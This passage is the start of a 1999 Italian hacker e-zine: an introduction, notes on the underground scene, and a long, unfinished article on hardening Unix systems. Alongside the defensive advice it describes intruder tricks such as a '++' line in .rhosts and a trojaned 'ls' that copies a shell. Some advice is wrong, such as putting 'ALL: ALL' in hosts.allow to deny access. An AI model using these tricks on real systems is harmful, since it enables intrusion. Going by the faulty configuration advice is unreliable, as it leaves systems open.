  $$$$$$$$$$           $$$$$$$$$$                    $$$$$$$$$$$$$
  $$$$$$$$$$           $$$$$$$$$$                    $$$$$$$$$$$$$
  $$$$$$$$$$           $$$$$$$$$$                    $$$$$$$$$$$$$
  $$$$$$$$$$           $$$$$$$$$$                       $$$$$$$
       $$$$$$$$$$$$$$$$$$$$$                            $$$$$$$
        $$$$$$$$$$$$$$$$$$$        'eXtreme             $$$$$$$
        $$$$$$$$$$$$$$$$$$$         Junkie'             $$$$$$$
        $$$$$$$$$$$$$$$$$$$          '99'               $$$$$$$
        $$$$$$$$$$$$$$$$$$$                             $$$$$$$
        $$$$$$$$$$$$$$$$$$$              $$$$$$         $$$$$$$
       $$$$$$$$$$$$$$$$$$$$$             $$$$$$         $$$$$$$
  $$$$$$$$$$           $$$$$$$$$$        $$$$$$$        $$$$$$$
  $$$$$$$$$$           $$$$$$$$$$          $$$$$$$$$$$$$$$$$$
  $$$$$$$$$$           $$$$$$$$$$   $$      $$$$$$$$$$$$$$$$    $$
  $$$$$$$$$$           $$$$$$$$$$   $$       $$$$$$$$$$$$$$     $$

--------------------------------------------------------------------
-              LA NUOVA E MITICA E-ZINE DI T0RMENT0                -
--------------------------------------------------------------------
* LA VITA CI RISERVA POCO, PERSONE CI ODIANO, LO STATO TENTA DI    *
* ALLONTANARCI, LA SICUREZZA AUMENTA MA CON ESSA AUMENTANO ANCHE   *
* I MODI DI FARE HACKING, TUTTI CREDONO DI POTER ESSERE DEGLI      *
* HACKER SOLO PERCHE' CONOSCONO NETBUS, MA E' IN QUESTO CONTESTO   *
* CHE INTERVENGO IO, PERCHE' LA MAGGIOR PARTE DI VOI CREDE CHE     *
* DIVENTARE HACKER NON COMPORTI NESSUN PERICOLO. CIO' LO PUO'      *
* AFFERMARE SOLO COLUI CHE SAPRA' I SISTEMI MEGLIO DELLE SUE       *
* TASCHE, SEGUITE IL MIO CONSIGLIO, STUDIATE, LEGGETE, ESPLORATE,  *
* PRATICATE IN LOCALE, SERVITEVI DI QUESTO PERIODO PIENO DI E-ZINE *
* PER APPROFONDIRE MEGLIO QUEST'ARTE, DOPO TUTTO QUESTO            *
* SARETE DIVENTATI NEWBIES, NON HACKER! HACKER, CI SI DIVENTA      *
* DOPO L'ACQUISIZIONE DI ESPERIENZA.                               *
********************************************************************
\    INDICE                                                        /
/                                                                  \
\   1 - INTRODUZIONE                                               /
/   2 - COSA CI STA OFFRENDO L'UNDERGROUND                         \
\   3 - SYSADMIN VS HACKER 1-0                                     /
/   4 - CGI: SCRIPT E TEORIA                                       \
\   5 - SMURF, COSA SONO                                           /
/   6 - PORT SURFING                                               \
\   7 - PICCOLO BUG DI mIRC                                        /
/   8 - BUG DI SENDMAIL 8.9.2                                      \
\   9 - BUFFER OVERFLOW DELLA BASH SHELL                           /
/  10 - GUIDA ALL'IRCWAR (PRIMA PARTE)                             \
\  11 - SU COSA SI BASA L'SSPING ATTACK ?                          /
/  12 - PING: MACCHINA DA GUERRA                                   \
\  13 - TRACEROUTE COME FLOODER                                    /
/  14 - CONSEAL FIREWALL: RULES E DESTRUCTION                      \
\  15 - DOS X KERNEL 2.2                                           /
/  16 - BOXAGGIO: TUTTI I COLORI                                   \
\  17 - VAI AVANTI TU CHE A ME VIEN DA RIDERE                      /
/  18 - COCABUTON: YES!                                            \
\  19 - FINE                                                       /
/                                                                  \                                                         
********************************************************************

##############################################################################


       INTRODUZIONE (IL COME, IL PERCHE',IL QUANDO, IL DOVE)


Sono sicuro che quasi la maggior parte di voi quando vedra' questa
e-zine rimarra' sorpreso. Ehi se, ce l'ho fatta anch'io.
Solo che secondo me non giovera' nessuno visto la marea di e-zine
che ci fruttua questo periodo. Ho tentato di mettere insieme quel 
poco che ho appreso, sia da testi inglesi, sia da manuali che ho 
letto man mano; beh, e' logico che si baseranno anche sulla mia 
esperienza personale.
Consideratevi fortunati, perche' se e' vero che da un lato c'e' un
casino di roba in giro, dall'altro nessuno ve lo spiega come ve lo
spiego io ;) Piu' che una e-zine io la definirei una raccolta
di exploit, visto che la maggior parte degli articoli tratta bug.
L'unico articolo che parla di phreaking e' "Boxaggio: tutti i colori".
Questo non e' un vero e' proprio articolo ma e' una raccolta di
tutti i tipi di box dalla A alla Z, dove in ogni numero di XJ ve ne
presentero' 4 sperando in una loro utilita'. Se ci fate caso la blue box
non e' presente; dedichero' un articolo interamente ad essa.
Vi racconto il motivo di questa uscita:
ho pensato che, rivolgendomi a dei lettori principianti, le persone
siano stanche di trovare articoli troppo tecnici o exploit in C che
sono messi li' senza nemmeno una spiegazione.
Il mio pensiero e' appunto di produrre e spiegare qualcosa di
difficile con parole e metodi facili.
L'unico problema e' che l'ho scritta quasi tutta in linux usando
pico(ehm), e se  l'impaginazione non va bene sotto windows, passate a linux!!!
Dopo questa breve intro, vado avanti con gli articoli!

##############################################################################

           COSA CI STA OFFRENDO L'UNDERGROUND ITALIANO

In questo periodo all'underground italiano si stanno unendo molti
gruppi di hacker, phreaker, cracker ecc ed e' per questo motivo
che mi vedo l'animo risollevato, visto che la nascita di nuovi gruppi
comporta ad una posizione piu' alta rispetto a quando si trovava
prima l'Italia. Con questo non voglio criticare i primi gruppi
come SystemDown ecc., anzi li ammiro molto visto che sono stati
i primi gruppi in questa schifo di nazione a venire con la testa
fuori. Infatti credo che questa formazione di gruppi e gruppetti
dipendi proprio da loro che hanno iniziato per primi.
Non so quanti di voi se ne sono accorti, ma io scrivo anche per
NewBies. Il perche' di cio'? Visto che loro si sforzano per
indicare al newbies la strada da prendere per diventare hacker,
io sono pienamente daccordo al loro pensiero.
Pero' ricordatevi bene che newbies non e' colui che attacca un sito
attraverso un expoit, e non sa nemmeno minimamente cosa faccia
quell'exploit. Il newbies prima di usare un prog che sfrutta un bug,
si informa meglio sulle funzioni del prog e tutti i passi che compie
per buggare quel server. Vorreste capire meglio il listato in C
del programma ma non sapete nulla del C? Bene, sapete come l'ho
imparato io il C ? Prima cosa guardando i listati, seconda cosa
ho comprato un libro sulla programmazione dei socket e terza cosa
modificando alcune cose per vedere cosa cambiava.
Se avete passione e molta voglia di imparare, non vi diverra'
difficile imparare il C, uno dei linguaggi base per imparare
l'hacking.
Ok, credo che basti per avervi fatto capire che tipo sono.
Sono lo stesso che l'anno scorso fece la hackernovello homepage,
solo che da allora mi ritengo molto maturato perche' la mia voglia
di apprendere l'hacking cresce sempre. Anzi a guardarla meglio
quella pagina la definirei lamer, solo che tra i newbies
ha riscosso molto successo, tant'e' che da allora ho ricevuto
350 e-mail, ;p .
Io parlo di hacking, mentre la Telekom guadagna, quasi quasi
ora passo a fare l'operatore telekom, prendo i soldi e non faccio
un cazzo. :3 Cmq, la mia era solo una battuta, io se un domani
lavorero' alla Telekom, lo faro' solo per scoprire i loro
segreti e comunicarveli :P
Beh, gia' mi sono dilungato abbastanza, l'ultimo messaggio
che vi mando:
"Ragionate da hacker, anche se non lo siete, perche' cosi' lo diventerete"
(Rime rulez)

##############################################################################
            
         ____   
        |  __)  ____   ____   _____              ____
        | |    | ___) ||  )) (_   _)            | __ |
        | |__  | ___) || ((    | |   _   _   _  ||__||
        |____) |____) ||  \\   |_|  |_| |_| |_| |____|

        (8--------->SysAdmin Vs Hacker 1-0<---------8)


Questo articolo puo' essere letto sia dal sysadmin sia dall'hacker, ognuno
ne puo' trarre vantaggio. Esso spiega come rendere il proprio sistema
sicuro e come comportarsi in caso di attacco.

-Piccola parentesi-

Molto tempo fa quando Unix era misconosciuto, si diffondeva tra gli operatori
la filosofia di rendere tutto condivisibile ovvero dare il permesso agli
altri utenti di vedere i propri file, questo perche' allora il modo di
ragionare era diverso da ora. Non rubavano le informazioni altrui o almeno
non trovavano il modo di renderle efficaci per i propri progetti,
non esisteva la privacy, insomma non avevano la mentalita' hacker cioe'
a loro piaceva solo studiare un sistema non scoprire le eventuali falle.
Il problema della sicurezza sorse quando Unix divenne piu' grande, ed entro'
a pieno titolo nella comunita' commerciale ed i file furono messi a
disposizione anche dell'utenza remota.

-fine parentesi-

Oggigiorno abbiamo bisogno di proteggerci costantemente , i metodi per violare
sono diventati davvero parecchi.
Un esempio sono i cookie:
quando visitiamo un sito che ci fa delle domande prima di seguire o che ha
delle determinate applet java e' probabile che abbia rovistato nei nostri
preferiti per vedere quali sono i nostri interessi ed attraverso essi
mandarci delle e-mail a scopo di lucro.

Allora i sysadmin prima di apprendere come gestire una rete dovranno prima
apprendere lezioni di hacking. Ebbene si', altrimenti non riuscira' ad
intuire quali saranno le prossime mosse dell'hacker.
Oltre a gestire il sistema e a mantenere costantemente aggiornato il server,
il sysadmin e' anche un hacker che si difende dagli altri hacker.

La sicurezza e' affrontata ovunque perche' sono molte le strade da percorrere
prima di rendere un sistema sicuro.

Ecco una frase che all'inizio puo' sembrare ironica ma dopo vi accorgerete
come sia tutto vero:

"L'unico sistema sicuro e' quello che non e' collegato ad una rete, viene
tenuto in una stanza chiusa a chiave ed e' spento"

-Le password

Purtroppo da sempre scegliere le passwd sono state un dilemma per il sysadmin.
"Cosa uso? T0rment0 o 0tnemr0T ?"
Perche' non li usiamo tutti e due? :)
Infatti se siete indecisi tra due parole usatele tutte e due pero' stando
attenti a mescolare i caratteri minuscoli a quelli maiuscoli.
" T0rmEnt00TneMr0T "
Potrebbe andare bene, solo che cosi' non c'e' nessun carattere speciale
e noi vogliamo rendere il tutto piu' difficile vero?
Allora usiamo " ^T0rmEnt0&0TneMr0t^ "
Eheh, voglio vede' quando me la indovinate!
Ricordatevi che i sistemi moderni utilizzano programmi di generazione password
piu' sofisticati. Questi programmi non vi permettono di inserire una password
troppo breve, ne' una parola presa dal dizionario, ne una sequenza degli
stessi caratteri.
Pero' mi raccomando fate in modo che la vostra password fosse qualcosa
di facile da ricordare, altrimenti sarete costretti a scriverla su un
foglietto, e se quel foglietto capitasse nelle mani sbagliate?

I programmi di password crittografano una password, ma poi Unix e Linux
le mette in bella mostra nel file /etc/passwd non e' strano?
Comunque all'inizio il DES (Data Encryption Standard) era considerato
cosi' valido che si credeva in un futuro senza problemi di decifrazione
solo che questo ha una pecca: se la gente avrebbe inserito come password
nomi, parole del vocabolario, login, le persone per crittografarle
dovevano solo inserire in un file tutte le parole ordinate, e confrontarle
con tutte quelli presenti sul sistema. Se non si usano parole comuni come
quelle di prima sara' un po' difficile scovarle. Pero' purtroppo il DES
non e' piu' un buon sistema di crittografia infatti e' stato definito
un sistema poco affidabile visto che quelli della EFF hanno costruito
una macchina chiamata 'DES Cracker' capace di decifrare qualsiasi parola
crittografata con questo sistema. Dopo una conferenza tenutasi a Roma il 22
Marzo di quest'anno, hanno deciso che il prossimo standard crittografico
sara' l'AES (Advance Encryption Standard).
Comunque vi consiglio di tenervi sempre aggiornati sui nuovi sviluppi,
sui metodi di decodifica conosciuti, sugli errori, sul dibattito
crittografico che e' in continua evoluzione.
Un trucco che potreste pensare per non dimenticare la password e' quello
di non cambiarla mai. Errato! Ci sono sempre delle conseguenze e se per
caso l'avete data ad un amico fidato con il quale avete litigato...

Non dimenticate di attivare il supporto per il file shadow che nel passwd
normale inserisce una x al posto della password. Poi le password saranno
messe nel file  shadow dove la locazione e' decisa da voi ed e' un file
che , al contrario del passwd, e' accessibile solo al root.

In un file di password generato da un sistema appena installato, non
dimenticatevi di annulare quei login che non vi servono, va a finire
che uno di quelli non hanno l'asterisco al campo delle password e
permettono l'accesso a tutti!

Esiste un metodo per permettere ad un utente di collegarsi al server
senza l'immissione di password. Consiste nel file .rhosts
Il file .rhosts ha un elenco di nomi di sistema e di login che possono
eseguire il login senza la password.
Questo metodo non e' molto pericoloso dato che controlla direttamente l'ip
prima di dare l'accesso a chiunque. Il vantaggio dell' .rhosts e' che
l'utente non ha bisogno di immettere la password e quindi se un hacker
ha messo uno sniffer sul vostro sistema non avra' mai la vostra passwd!
Pero' aspettate prima di esultare: se un hacker riesce ad inserire nel
file .rhosts la stringa " ++ " , beh riesce a dare l'accesso a tutti gli ip.
Quindi vi consiglio caldamente di controllare spesso il file .rhosts
e controllare se ha la stringa " ++ " . Basta che fate un 'grep ++ .rhosts',
anzi la miglior cosa e' inserire il controllo nel cron giornaliero.

-I Gruppi

Il campo UID fornisce tutta la sicurezza sul sistema dopo il login.
E' importante non avere due account con lo stesso UID. Dovete stare attenti
soprattutto agli UID 0 , che assegna i poteri di root al nome di login.

Il numero GID permette a login differenti di lavorare insieme come gruppo.
Utilizzando i permessi di gruppo sui file e sulle directory, e' possibile
esaminare e accedere a questi file e a queste directory, persino anche
quando la proprieta' e' mantenuta da una persona. I gruppi sono contenuti
nel file /etc/group ed il file dovrebbe assomigliare a questo:

root::0:root
bin::1:root,bin,daemon
daemon::2:root,bin,daemon
sys::3:root,bin,adm
adm::4:root,adm,daemon
tty::5:
disk::6:root
lp::7:daemon,lp
mem::8:
kmem::9:
wheel::10:root,T0rment0
dip::40:
ftp::50:
nobody::99:
users::100:T0rment0
T0rment0::500:T0rment0

Il gruppo denominato wheel e' un gruppo speciale che permette a determinati
utenti di diventare root o superuser dopo che hanno eseguito il login con il
loro account. Questo e' importante, soprattutto per la sicurezza sulla rete.
Il penultimo e' dedicato agli utenti e in questo caso sono io (sigh!),
l'ultimo e' un gruppo formato solo da me pero' tutti possono stare
nel mio gruppo. Comunque se siete voi gli amministratori potrete
modificare /etc/group a vostro piacere.

-I permessi

I sistemi Unix, come ben sapete, hanno una struttura basata su due livelli
di permessi. Abbiamo l'utente normale e l'utente superuser (root).
Se siete amministratore di sistema potreste avere la tentazione di collegarvi
sempre da root. Questo per due motivi: il primo e' che potrete fare qualsiasi
operazione e il secondo e' che avrete accesso a tutti i file. E i svantaggi?
Beh se volete cancellare i file di una directory e digitate 'rm -rf *' ,
per sbaglio cancellate un'altra directory tipo la directory /usr/bin, come
la mettete? Se nel momento dell'operazione avreste avuto i permessi di utente
generale, il sistema in qualche modo vi avrebbe fatto capire cio' che stavate
facendo. Dunque ricordatevi: quando dovete fare operazioni importanti
collegatevi come root, invece se volete semplicemente navigare in internet
o non dovete fare qualcosa di importante, loggatevi come utente normale.
L'altro motivo che dovrebbe indurvi a svolgere solo le attivita' piu'
importanti com root e' legato alla sicurezza. Infatti esistono trojan
che vengono rimpiazzati ai comandi normali dagli hacker, in questo modo
mentre voi digitate il vostro 'ls' , in realta' e' un trojan che copia
la shell '/bin/sh' in '/tmp/boh' (chissa' che mi ricorda, eheh! ).
Infatti il programma (nel 90% dei casi) vi dara' un messaggio di errore,
voi lo dovrete eseguire una seconda volta, solo che questa volta andra' tutto
bene visto che se lo avrebbe rifatto voi avreste indugiato un attimo.
Questo e' buon motivo per eseguire lo stretto necessario da superuser.
Un metodo per combattere cio' (se il comando e' stato copiato in una directory
non di sistema) e' di non mettere mai un punto nella variabile PATH della
vostra shell di root. Infatti il punto serve ad eseguire un comando
nella directory attiva senza utilizzate il './' prima del comando.

Un'altra tecnica utilizzata dai trojan fa riferimento ai bit di SUID e di GUID
impostati ai file. Di solito nei linux odierni il demone pppd e il sendmail,
tra gli altri, honno impostato il bit di SUID.
Una volta impostato il bit di SUID il programma in esecuzione puo' prendersi
i privilegi di root a prescindere da chi e' stato ad eseguirlo. In modo
analogo con il bit GUID impostato, il programma puo' commutare l'ID del gruppo
in quello del gruppo a cui appartiene e avere tutti i permessi e la capacita'
di tale gruppo. Da come avete notato, i bit di SUID e GUID sono molto potenti
e dovrebbero essere assegnati solo a programmi gestiti con molta attenzione.
Se una persona riesce a scrivere un programma trojan e impostarsi i propri
bit di SUID e GUID, ogni volta che il programma viene eseguito puo' facilmente
prendersi i permessi.

Il metodo migliore per proteggersi e' di controllare periodicamente se sono
stati aggiunti file che hanno i bit di SUID e GUID. Un buon metodo per vedere
quali file hanno questi bit impostati e' dare un comando dalla shell in
questo modo:

[toor@T0rment0]# find / -type f -perm +6000 -exec ls -l {} \; | sort >/tmp/suid 

Vi consiglio di farlo di tanto in tanto, mi raccomando se alcuni file con
questi permessi non vi servono, rimuovete i bit SUID e GUID.
Anzi vi conviene fare il primo controllo appena vi installate il Linux,
mentre dopo averlo fatto la seconda volta (cambiando ovviamente il file di
output) date un comando come questo :

toor@T0rment0/# diff /tmp/suid /tmp/suid.2

Per vedere quali sono le differenze, e se non vi comunica niente... beh
vi e' andata bene!

-I log

I file di log piu' importanti che dovete esaminare sono '/var/run/utmp',
'/var/log/wtmp' e '/var/log/btmp'. Il file utmp mostra chi sta collegato
col sistema in quel momento e viene esaminato dal comando 'who' o 'w' . 
Il file wtmp mostra chi e' riuscito a fare il login a quel sistema e quando
il sistema e' stato chiuso, modificato,riavviato, ecc. Il file btmp mostra
i tentativi di login non andati a buon fine. Nessuno di questi file dovrebbe
essere scrivibile dall'utente generale.
Ognuno di questi file e' in un formato che li rende illegibili da comandi
come cat o more, e per leggerli avete bisogno dei comandi last e lastb.
Il vostro sistema potrebbe avere anche il file '/var/log/secure', che e' un
file ASCII che elenca tutti i login non andati a buon fine e le connessioni
dai diversi demoni. Infine, il file /var/log/messages/ contiene molti messaggi
di tutti i tipi. I segnali che il sistema non va come dovrebbe nel campo della
sicurezza sono per esempio un gran numero di login andati a vuoto o un numero
consistente di tentativi di diventare root. Inoltre se avete il messaggio
dell'ultimo login, esaminatelo e se vedete qualcosa di strano comunicatelo
agli altri utenti.

-Crittografia

Tutte le protezione esaminate riguardano solo i permessi e l'accesibilita'
al disco. Si e' parlato di crittografia solo nel file delle password;
quella crittografia viene chiamata "crittografia a senso unico" infatti
sia quella dopo il login, sia quella fornita dal programma passwd sono
crittografate allo stesso modo e vengono usate per vedere se sono identiche.
Anni fa, nei sistemi Unix erano presenti comandi utili a crittografare e
decrittografare in modo semplice i file, e il loro funzionamento si basava
su una tecnica della macchina tedesca Enigma della seconda guerra mondiale.
Questa tecnica permetteva agli utenti di scambiarsi il software crittografato
molto facilmente, e venne eliminata perche' il governo statunitense non
permetteva di esportare software crittografato fuori dal proprio stato.
Gia' allora era una causa vana: infatti le persone non avrebbero mai
utilizzato quel software con un algoritmo di criptaggio cosi' facile, infatti
la gente usava altri software presenti in rete e piu' affidabili.
Dunque cio' che fece lo stato americano ebbe un effetto collaterale:
le persone si misero in cerca di un software di criptaggio migliore e
disponibile gratuitamente. Fu allora che venne inventato il PGP (Pretty
Good Privacy), solo che questo software non viene distribuito con le
moderne distribuzioni di Unix e Linux, ma basta fare una piccola ricerca
per trovarlo. Dunque considero il PGP un metodo sicuro per mandare i propri
dati (anche quelli riservati) mediante internet.
Per il funzionamento del PGP vi consiglio di fare una ricerca su internet,
visto che prima di usare un programma e' meglio se sappiamo cosa fa.

-I sistemi in rete

Se fino ad ora avete acquisito una certa fiducia con i propri dipendenti o
colleghi, se metterete il vostro sistema la perderete. Non mi riferisco
agli altri ma all'utenza remota visto che e' sempre un rischio mettere
i propri dati accessibili da tutti.
Su internet esistono molte persone che cercano di entrare in un server:
alcuni lo fanno per divertimento, altri perche' hanno scoperto che il vostro
sistema ha un'ampiezza di banda superiore agli altri server hackati da lui,
altri lo fanno per trovare eventuali pecche e comunicarvelo.
Beh se quest'ultimi lavorano per il CERT, allora lasciateli fare altrimenti
tenete sempre d'occhio i vostri log.
Il primo passo per comprendere la sicurezza su internet e' capire come
funzionano le cose su internet.
In genere le applicazioni su internet si dividono in due parti:
parte client e una parte server.
La prima rimane sul vostro computer e genera messaggi in un protocollo per
comunicare su una determinata porta con gli altri sistemi sulla rete.
La parte server viene denominata anche demone di rete. In argomento, vi
ricordo che esistono anmche gli zombie di Unix (non sono io!) che sono
processi figlia morti e non hanno nessun processo genitrice che li attende.
Di conseguenza, esistono per sempre finche' qualcuno li aspetta o fino al
successivo reboot del sistema.

Molti servizi di rete sono forniti con Linux. Questi servizi sono in genere
elencati in un fie in '/etc/services'. Dove la prima voce indica il nome del
servizio, la seconda e' il numero di porta seguito dal protocollo utilizzato,
la terza colonna potrebbe essere il nome dell'alias del servizio o persino
una serie di alias.
I numeri elencati sotto il 1024 sono le porte che possono essere collegate
solo sulla root e quindi su una macchina gestita da un amministratore.
Perche' un servizio sia collegato su una porta devono verificarsi due cose:
il server deve essere avviato durante il processo di avvio del sistema
oppure da un altro demone chiamato 'inetd'.
Se esaminate il file '/etc/inetd.conf', potreste vedere delle voci.
Queste voci mostrano il nome del servizio, il tipo di socket che utilizza, se
il servizio di datagram deve attendere finche' una richiesta non e' stata
soddisfatta o puo' continuare ad inviare i pacchetti, il nome dell'utente
e il nome e gli argomenti del servizio.
Per fornire sicurezza alla rete, potrete inserire un # davanti al servizio
nel file '/etc/services' o '/etc/inetd.conf', in modo che diventino dei
commenti. Una volta modificati vi bastera' digitare:
'killal -HUP inetd' , che mandera' un segnale di riavvio al processo.

I servizi da cui potrete liberarvi sono:
gopher e UUCP (ormai con l'avvento del web hanno perso importanza),
bootps (utilizzato soprattutto per avviare stazioni di lavoro senza dischi),
tftp(che e' simile all'ftp, ma non richiede un login o l'autenticazione ed
e', quindi, un po' pericoloso) e rexec (per far avviare applicazioni win da
unix), che potete tutti commentarli nel file '/etc/services/' con un #.
Quando poi vi serviranno, cancellateci il #

Un altro metodo per limitare i servizi ai sistemi esterni e' utilizzare i
wrapper sui demoni TCP. Un demone valido e' 'tcpd'. Questo wrapper svolge
diverse funzioni quando un servizio viene richiesto.

a) Registra un messaggio appropriato in un file di log
b) Controllo se il sistema e l'utente che richiedono il servizio hanno il
   permesso di utilizzarlo
c) Controlla se il sistema chiamante e' quello che afferma di essere

Dopo aver ricevuto la richiesta iniziale e aver registrato un messaggio in un
file di log, il demone 'tcpd' controlla due file : /etc/hosts.allow e
/etc/hosts.deny. Se non esistono il controllo dell'accesso viene disattivato.
Se non esiste una corrispondenza in entrambi i file, l'accesso viene concesso.
Per negare l'accesso a tutti i siti e a tutti i servizi inserite in
hosts.allow quanto segue:

ALL: ALL

Cio' blocca l'acceso a tutti i servizi per tutti i siti. Pero' con questo
il sistema diventa inacessibile a chiunque mentre per renderlo accessibile
a tutti quelli che hanno il vostro dominio, digitate in hosts.allow :

ALL: LOCAL,     @T0rment0.urk

Oppure per abilitare tutti i servizi e negarne uno (per esempio il finger)
digitate quanto segue in hosts.allow :

ALL EXCEPT in.fingerd : .tin.it EXCEPT proxy.tin.it

Questo fa in modo  che il demone 'fingerd' venga negato a tutti gli utenti
che stanno su un dominio tipo 'tin.it' eccetto quelli che stanno su dominio
'proxy.tin.it'. Capito? Non e' poi cosi' difficile.
Sono disponibili altri metodi per abilitare e disabilitare i servizi con
questo pacchetto wrapper. Per ulteriori informazioni, consultate la pagina
digitando 'man hosts_access' sotto linux.

-I servisi NIS e NFS

Il sistema NFS venne sviluppato dalla Sun Microsystems ed e' ora utilizzato
nei sistemi Unix e Linux sparsi nel mondo. Questo sistema permette a molti
sistemi sulla rete di condividire file ed altre cose in modo trasparente.
Per permettere ad un client di montare il proprio filesystem sul suo sistema,
il filesystem dovra' essere specificato nel file '/etc/exports'.
Ogni voce del file contiene filesystem diversi, l'elenco dei domini che
possono accedervi, una serie di permessi di lettura e scrittua e
altre opzioni.

Purtroppo, il sistema NFS esegue l'autenticazione  solo una volta, cioe'
quando si monta il filesystem. Dopodiche' lavora con un handle che agisce
come una chiave. Un programmatore di sistema competente e' capace di
ingannare l'handle oppure di far credere al sistema che il pc con il quale
sta comunicando non e' in realta' quello che sta comunicando.
Vi consiglio di attivare il sistema NFS solo per la rete locale.
Il sistema NFS era stato progettato per far comunicare i vari sistemi con
tempi piu' veloci delle normali connessioni internet, quindi questa non e'
una vera perdita.

La Sun sviluppo' anche servizi come NIS o NIS+ (Network Information Service)
noti in precedenza come pagine gialle. Iservizi vennero sviluppati per
mantenere una mappa delle informazioni sulla rete.Dato che fanno ancora
affidamento ai bit di UID di login, un login che ha due sistemi deve avere lo
stesso UID su entrambi.
Il sistema NIS fornisce molte informazioni sui diversi sistemi dal server al
client, per esempio quelle riportate sotto.

a) Il file delle password: lo stesso per tutti i sistemi
b) Il file degli host: comprende gli indirizzi internet di tutti i sistemi
c) Il file degli alias: comprende i nomi di tutti gli alias che potete
   utilizzare per assegnare un nome alle cose
d) Il file dei gruppi: mostra i nomi dei gruppi di progetto
e) Il file dei servizi:mostra tutti i servizi e le porta a loro assegnate

In breve il sistema NIS mostra tutto quello che qualunque aggressore ha
bisogno di sapere sul vostro sul sistema. Il siste NIS e' disponibile
conoscendo il vostro nome di dominio NIS, che e' abbastanza facile da
scoprire. Utilizzando il wrapper (visto prima e che e' integrato nelle
versione moderne di ypserv), potete controllare l'accesso di rete alle vostre
informazioni NIS con lo stesso meccanismo utilizzato per gli altri servizi.
Per essere certi che il demone ypserv utilizzi il wrapper TCP, provate a
eseguire 'ypserv' con l'opzione '-version' da root. Comunque, non esiste
nessun motivo per permettere alle informazioni NIS di andare al di fuori
della rete locale.

-L' X-Windows

X-Windows e' senza dubbio uno dei servizi piu' acclamati di Unix, e potrebbe
anch'esso comportare dei rischi per la sicurezza. Ed e' per questo che
alcuni utenti preferisco eseguire l' X-Windows come client/server.
E' abbastanza facile eseguire il client sul proprio sistema e visualizzarlo
sul monitor di un altro sistema. Tuttavia un client malintenzionato
potrebbe attaccare il vostro X-Windows, ottenendo o un dump della vostra
schermata o alcune informazioni preziose se sono diretti ad un terminale
che e' abilitato come root .
Anche se X-Windows e' dotato di diversi meccanismi per la sicurezza
(uno e' il magic cookie, un altro e' l'xhosts), alcuni utenti potrebbero
trovarli difficili da utilizzare.
Il sistema piu' semplice da utilizzare e' avere 'xdm' o la schermata di login
e password nell'ambiente del desktop. Entrambi utilizzano una tecnica di
'magic cookie' per garantire la sicurezza e non richiedono particolari sforzi.
Per avviare 'xdm', eseguite il login come root ed e' attiva la modalita'
carattere. Digitate 'xdm'. Venite scollegati dal sistemi, poi 'xdm' avvia
il server X e appare una schermata di login.
Ora potete collegarvi nel modo consueto e utilizzare l'X-Windows

-I firewall

E' duro il lavoro di mantenere sicuro il proprio sistema e il sysadmin, oltre
che controllare i permessi dei file e se qualcuno sta violando il sistema,
deve svolgere altre mansioni. Se in una rete viene lasciato un sistema aperto,
si mette a repentaglio l'integrita' di tutta la rete. Ed e per questo che e'
stato inventato il concetto di firewall.
Un firewall e' un sistema gateway tra internet e la rete locale, ed utilizza
diverse tecniche per proteggere la rete locale dal resto. Se l'impostate come
gateway per i servizi, questo significa che c'e' un solo sistema che deve
pagare il prezzo di una maggiore sicurezza. Il resto della rete puo'
rilassarsi, ma non del tutto.
Le funzioni del firewall sono:

a) Permette solo a determinati servizi di effettuare la connessione
b) Permette solo determinate azioni da determinati servizi, chiamati proxy
c) Mantiene tutti i sistemi e servizi al minimo per evitare "trappole".

Molte delle tecniche illustrate per la sicurezza della rete sono applicate
alla macchina firewall. Visto che permette di accedere a tutta la rete, dalla
macchina firewall di solito vengono tolti funzionalita' e programmi.
Non sono neanche permessi gli account di login (tranne quelli necessari alla
gestione della macchina). La manutenzione viene eseguita localmente dalla
console della macchina firewall.
La macchina firewall in genere ha due controller di rete: un agganciato alla
rete interna, l'altro a quella esterna. Di solito viene impostata come router
che prende le richieste da internet destinate alla rete locale e le passa alle
reti interne.
Con un minimo di lavoro di test, la macchina firewall puo' disabilitare le
richieste ai servizi. I programmi che svolgono queste funzioni di test e di
inoltro, vengono spesso chiamati 'server proxy'. Il sistema client lo vede
come server mentre il sistema server lo vede come client.
Ecco alcune delle librerie dei toolkit per i firewall proxy.

a) TIS FWTK (TIS International Firewalls Toolkit).
   Questo e' il toolkit piu' famoso ed e' capace di fornirvi il tipo di
   sicurezza di cui avete bisogno. Lo potete scaricare qui:
   ftp://ftp.tis.com/pub/firewalls/toolkit
b) SOCKS toolkit
   Questo toolkit serve per i servizi basati su TCP. Lo potete scaricare qui:
   ftp://coast.cs.purdue.edu/pub/tools/unix/socks
c) UDP Packet Realayer
   Gestisce i servizi basati su UDP. Lo potete scaricare qui:
   ftp://coast.cs.edu/pub/tools/unix/udprelay-0.2.tar.gz

Anche se i firewall possono aiutare a proteggere la rete interna da attacchi
esterni, possono talvolta essere difficili da far girare. Esempi:
alcune aziende non permettono ai dipendenti di trasmettere i file mediante
FTP dall'interno dell'azienda verso un sito esterno per paura che qualcuno
possa divulgare i segreti aziendali.
Alcune aziende non permettono alle sessioni telnet di penetrare nei firewall,
altre non permettono neppure a un server proxy di consentire un accesso
efficace a servizi validi. Invece altre permettono l'accesso tramite un
firewall con una serie complessa di password e di operazioni di
autenticazione.

Alcuni di questi metodi utilizzano chiavi generate automaticamente, che sono
valide solo per un breve periodo di tempo e vengon generate da un sistema
di generazione "black box", in genere trasportato dalla persona che fa il
login. Oppure, utilizzando una tecnica denominata tunneling, che crittografa
tutti i dati provenienti dal sistema estreno e "scava una galleria" sotto il
firewall fino ai sistemi interni. spesso, non esistono programmi client per
ogni sistema che un utente potrebbe utilizzare su internet e non esiste un
programma client per l'utente.

-In caso di attacco

La probabilita' di attacco e'proporzionale all'importanza del vostro server.
Piu' il server  importante piu' e' soggetto agli attachi, ma con cio'
non ho detto che i server minori non saranno mai attaccati. In entrambi i casi
dovete riconoscere un attacco che si puo' presentare nelle seguenti forme:

a) Appaiono nuovi account, che non avete creato voi
b) Gli account diventano attivi anche se l'utente e' in ferie
c) Cominciano ad apparire file inconsueti nelle directory di sistema e
   nelle directory degli utenti.
d) Le prestazioni del sistema cominciano a diminuire
e) Il sistema crasha all'improvviso.
f) I file di log scompaiono o hanno delle lacune temporali (quando
   l'aggressore cerca di coprire le proprie tracce)
g) Arrivano lamentele dagli altri siti, che sono attaccati dall'invasore che
   cerca di far cadere la colpa su di voi

Tutti questi segnali o altri impercettibili indicano un'invasione. Talvolta,
l'invasore non fa beccare facilmente e cosi' sarete costretti ad esaminare
di volta in volta i file di log e di history. Solo che a volte i file di
